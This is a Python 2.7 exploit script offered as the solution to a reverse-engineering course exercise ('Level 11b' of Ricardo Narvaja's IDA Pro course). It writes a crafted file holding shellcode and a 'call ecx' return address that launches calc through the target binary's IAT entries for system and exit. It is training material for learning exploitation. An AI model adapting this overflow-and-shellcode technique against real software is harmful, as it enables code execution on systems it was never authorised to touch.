# Python 2.7 x86
# Solution for auto evaluation: Level 11b
# Curso IDA Pro de Ricardo Narvaja.
# by @rextco
# Run as admin | to write in HD C:/ python exploit-11b-1.py
import string
import random
import struct


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for char in range(length))


def exploit():
    print("Exploit!Generate!File")

    shell = "\x83\xC1\x18\x51\xFF\x15\x80\x30\x10\x10\xFF\x15\x9C\x30\x10\x10\x59\xC3"
    # ADD ECX, 0x18
    # PUSH ECX              ; ptr calc
    # CALL [0x10103080]		; IAT system
    # CALL [0x1010309C]		; IAT exit
    # POP ECX
    # RET

    # Setup
    stuff = ""
    stuff += shell + "\x90" * (20 - len(shell))
    stuff += struct.pack("<L", 0x1010214C)      # 1010214C call ecx
    stuff += "calc"                             # Para formar la string calc, aprovechando el strtok
    stuff += "\x20\x00"

    write_file("C:/lista.txt", stuff)
    print("length = {:d}".format(len(stuff)))
    print("content = {}".format(stuff))


if __name__ == "__main__":
    exploit()

# Work under: Windows 7
